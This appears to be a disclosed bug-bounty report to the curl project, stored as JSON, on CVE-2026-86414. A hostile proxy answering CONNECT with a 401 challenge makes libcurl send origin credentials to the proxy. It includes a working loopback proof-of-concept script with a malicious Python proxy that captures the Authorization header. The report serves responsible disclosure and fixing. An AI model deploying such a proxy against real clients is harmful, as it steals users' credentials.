@@ -1,0 +1,109 @@
+{
+  "id": 3993566,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTkzNTY2",
+  "url": "https://hackerone.com/reports/3993566",
+  "title": "CVE-2026-86414: leaking host credentials to HTTP proxy",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-03T15:06:49.145Z",
+  "submitted_at": "2026-09-03T15:06:49.522Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-86414"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-14T07:35:19.230Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-14T06:36:24.739Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nI've found that found that an untrusted HTTP proxy can trick libcurl into sending the *origin's* credentials (Basic password, or a Negotiate/Kerberos ticket) to the proxy itself, by answering the `CONNECT` tunnel request with `401 WWW-Authenticate` instead of the expected `407 Proxy-Authenticate`. Yes, the dreaded and well-known, \"malicious proxy\".\n\n## The bug\n\nBoth the H1 and H2/H3 CONNECT-response handlers decide whether a header applies to the proxy or the origin purely by status code:\n\n```c\n// lib/http_proxy.c:491-501 (Curl_http_proxy_inspect_tunnel_response, H2/H3)\nif(resp->status == 401) {\n    auth_reply = Curl_dynhds_cget(&resp->headers, \"WWW-Authenticate\");\n}\nelse if(resp->status == 407) {\n    auth_reply = Curl_dynhds_cget(&resp->headers, \"Proxy-Authenticate\");\n}\n\nif(auth_reply) {\n    ...\n    result = Curl_http_input_auth(data, resp->status == 407,\n                                  auth_reply->value);\n```\n\n```c\n// lib/cf-h1-proxy.c:396-406 (on_resp_header, H1)\nif((checkprefix(\"WWW-Authenticate:\", header) && (401 == k->httpcode)) ||\n   (checkprefix(\"Proxy-authenticate:\", header) && (407 == k->httpcode))) {\n\n    bool proxy = (k->httpcode == 407);\n    char *auth = Curl_copy_header_value(header);\n    ...\n    result = Curl_http_input_auth(data, proxy, auth);\n```\n\nBoth call `Curl_http_input_auth(data, proxy, ...)` with `proxy = (status == 407)`. For a `401` — which is what our malicious proxy returns — `proxy` is `false`, and `Curl_http_input_auth` updates `data->state.authhost`, the *origin's* auth state, not the proxy's:\n\n```c\n// lib/http.c:1067\nCURLcode Curl_http_input_auth(struct Curl_easy *data, bool proxy,\n                              const char *auth)\n{\n  ...\n  if(proxy) {\n    availp = &data->info.proxyauthavail;\n    authp = &data->state.authproxy;\n  }\n  else {\n    availp = &data->info.httpauthavail;\n    authp = &data->state.authhost;\n  }\n```\n\nThere is nothing anywhere in this call chain that knows \"we are still inside CONNECT, talking to the proxy, not the origin.\" A `401`/`WWW-Authenticate` at this point is entirely proxy-controlled input, but it is processed exactly as if it came from the real origin server.\n\nOnce `authhost.picked` is set this way (e.g. to `CURLAUTH_BASIC`), curl retries the `CONNECT` request, and `output_auth_headers()` — which decides what to attach to *any* request, including the CONNECT itself — has no check preventing it from firing before the tunnel exists:\n\n```c\n// lib/http.c: output_auth_headers(), Basic branch\nif(authstatus->picked == CURLAUTH_BASIC) {\n    if(\n       (proxy && conn->http_proxy.creds && ...) ||\n       (!proxy && data->state.creds &&\n        Curl_creds_has_user_or_pass(data->state.creds) &&\n        !Curl_checkheaders(data, STRCONST(\"Authorization\")))) {\n      auth = \"Basic\";\n      result = http_output_basic(data, conn, proxy);\n```\n\n`proxy=false` here means it emits a plain `Authorization: Basic <origin creds>` header – not `Proxy-Authorization` – directly on the `CONNECT` line sent to the proxy. For Negotiate, the same poisoning makes `auth_spnego()` set `data->req.newurl`, which triggers a CONNECT retry that computes and sends a real Kerberos service ticket for the *origin* to the proxy instead.\n\n## Impact\n\nAny proxy an application is configured to route through (`CURLOPT_PROXY`) can harvest the origin credentials (`CURLOPT_USERPWD`, or a Kerberos ticket) that were only ever meant to reach the origin server, simply by answering the tunnel setup with a `401` instead of a `407`. This works even when the caller uses `--anyauth`/`CURLAUTH_ANY` specifically to avoid sending credentials until challenged — the proxy manufactures the challenge itself, on behalf of a host it doesn't own.\n\nPreconditions: `CURLOPT_PROXY` configured, origin credentials set (`data->state.creds` non-NULL), `CURLOPT_HTTPAUTH` includes a method the proxy can advertise (Basic is enough), and `CURL_DISABLE_PROXY`/`CURL_DISABLE_HTTP` off (both default off).\n\n## PoC\n\nMalicious proxy: on the first `CONNECT`, replies `401 WWW-Authenticate: Basic` instead of tunneling; on the retry, establishes the tunnel and records whatever cleartext request curl sends through it.\n\n```sh\n#!/bin/sh\n# Reproduction: untrusted HTTP proxy poisons ORIGIN auth state (data->state.authhost)\n# by answering a CONNECT tunnel request with \"401 WWW-Authenticate: Basic\".\n# The shipped libcurl then preemptively sends the operator-configured ORIGIN\n# credentials over the cleartext proxy tunnel, where the proxy reads them --\n# even though --anyauth normally withholds credentials until challenged.\n#\n# Env overrides (sensible defaults for the build container):\n#   VF_PORT    - loopback port for the malicious proxy   (default 8991)\n#   VF_MARKER  - marker path the proxy creates on leak    (default /tmp/vf-cred-leak)\nset -e\nMODE=\"$1\"\nPORT=\"${VF_PORT:-8991}\"\nMARKER=\"${VF_MARKER:-/tmp/vf-cred-leak}\"\nWORK=\"$(mktemp -d)\"\n\n# --- setup (runs in both arms; must not depend on MODE for its EFFECT) ---\nrm -f \"$MARKER\"\n\ncat > \"$WORK/proxy.py\" <<'PY'\nimport socket, sys, os\nMODE=sys.argv[1]; PORT=int(sys.argv[2]); MARKER=sys.argv[3]\nsrv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nsrv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\nsrv.bind((\"127.0.0.1\",PORT)); srv.listen(1)\nsys.stdout.write(\"LISTENING\\n\"); sys.stdout.flush()\ndef rd(c):\n    d=b\"\"; c.settimeout(5)\n    try:\n        while b\"\\r\\n\\r\\n\" not in d:\n            ch=c.recv(4096)\n            if not ch: break\n            d+=ch\n    except Exception: pass\n    return d\ntry:\n    srv.settimeout(15)\n    c,_=srv.accept()\n    rd(c)  # CONNECT #1\n    if MODE==\"exploit\":\n        # attack: answer CONNECT with an ORIGIN 401 challenge, poisoning authhost\n        c.sendall(b\"HTTP/1.1 401 Unauthorized\\r\\n\"\n                  b'WWW-Authenticate: Basic realm=\"o\"\\r\\n'\n                  b\"Content-Length: 0\\r\\n\\r\\n\")\n        rd(c)  # CONNECT retry\n    # control: benign proxy, no 401 poisoning\n    c.sendall(b\"HTTP/1.1 200 Connection established\\r\\n\\r\\n\")\n    tun=rd(c)  # the cleartext tunneled ORIGIN request, produced by shipped curl\n    # Marker creation depends ONLY on what shipped curl transmitted, identically\n    # in both arms -- the harness stats the file itself.\n    if b\"\\r\\nAuthorization: Basic \" in tun or tun.startswith(b\"Authorization: Basic \"):\n        open(MARKER,\"w\").write(\"origin credential observed by proxy\\n\")\n    try:\n        c.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nhi\")\n        c.close()\n    except Exception: pass\nexcept Exception as e:\n    sys.stderr.write(\"proxy error: %r\\n\"%(e,))\nPY\n\n# start the malicious proxy and wait until it is listening\npython3 \"$WORK/proxy.py\" \"$MODE\" \"$PORT\" \"$MARKER\" > \"$WORK/proxy.out\" 2>&1 &\nPXPID=$!\ni=0\nwhile [ $i -lt 50 ]; do\n  grep -q LISTENING \"$WORK/proxy.out\" 2>/dev/null && break\n  i=$((i+1)); sleep 0.1\ndone\ngrep -q LISTENING \"$WORK/proxy.out\" || { echo \"proxy failed to start\"; cat \"$WORK/proxy.out\"; exit 1; }\n\n# everything is up and the shipped runtime is about to be exercised\n: > \"${VF_READY:-/dev/null}\"\n\n# --- exercise the shipped curl exactly once ---\n# -p/--proxytunnel forces CONNECT even for an http:// origin, so the origin\n# request travels through the proxy-controlled cleartext tunnel.\n# --anyauth means curl should NOT send credentials until challenged BY THE ORIGIN.\ntimeout 30 curl -s -o /dev/null \\\n    -x \"http://127.0.0.1:${PORT}\" -p \\\n    -u SECRETUSER:SECRETPASS --anyauth \\\n    \"http://origin.test/path\" || true\n\nwait \"$PXPID\" 2>/dev/null || true\necho \"=== proxy log ($MODE) ===\"; cat \"$WORK/proxy.out\"\necho \"=== marker present? ===\"; ls -l \"$MARKER\" 2>/dev/null && echo \"MARKER EXISTS\" || echo \"no marker\"\n```\n\nWe run it with `sh ./reproduce.sh exploit`. Result: on the exploit run, the marker file appears — the proxy observed `Authorization: Basic` on the tunneled request:\n\n```\n=== proxy log (exploit) ===\nLISTENING\n=== marker present? ===\n-rw-r--r-- 1 root root 36 Sep  2 11:34 /tmp/vf-cred-leak\nMARKER EXISTS\n```\n\nOn the control run (`sh ./reproduce.sh control`)  (proxy replies `200 Connection established` immediately, no `401`), the marker never appears — no `Authorization` header is sent, exactly as `--anyauth` promises. Same client flags, same origin, the only variable is whether the proxy injects a `401` during `CONNECT`.\n\n## Where it came from\n\nThe root cause is since [`52ceab5e41`](https://github.com/curl/curl/commit/52ceab5e41a01b4d1227876d51a3680a3ce5a841) (2003-09-03, \"Re-arranged code to make the proxy-CONNECT loop able to do some of the authentication negotiations needed for NTLM, Digest etc.\"), the CONNECT-tunnel response parser has shared the same `401 → WWW-Authenticate → origin auth state` logic used for real origin responses, distinguishing proxy vs. origin purely by status code (`401` vs `407`) rather than by *why* the response was received. Every later rewrite of the proxy-tunnel code (the 2016 `http_proxy.c` restructure, the 2022–2023 connection-filters split into `cf-h1-proxy.c`/`cf-h2-proxy.c`, and this year's HTTP/3 CONNECT/MASQUE support in `http_proxy.c`) carried the same status-code-only logic forward unchanged. It's present at current `main` ([`38703fe2`](https://github.com/curl/curl/commit/38703fe2610bf6e79390bfc93a8558ffc0e2b02c), 2026-09-02).\n\n## Suggested direction\n\nWhile a `CONNECT` tunnel is being negotiated, a `401`/`WWW-Authenticate` from the proxy should either be ignored or treated as proxy-scoped, never routed into `data->state.authhost`. Concretely: pass an explicit \"we are tunneling, not talking to the origin yet\" flag into `Curl_http_input_auth()` (or refuse to call it at all for `401` during CONNECT), and make sure `authhost` state can't leak into a CONNECT retry's `Authorization` header before the tunnel is actually established.\n\nCheers,\nJosh\n\n## Impact\n\nOrigin credentials may be leaked to proxy.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
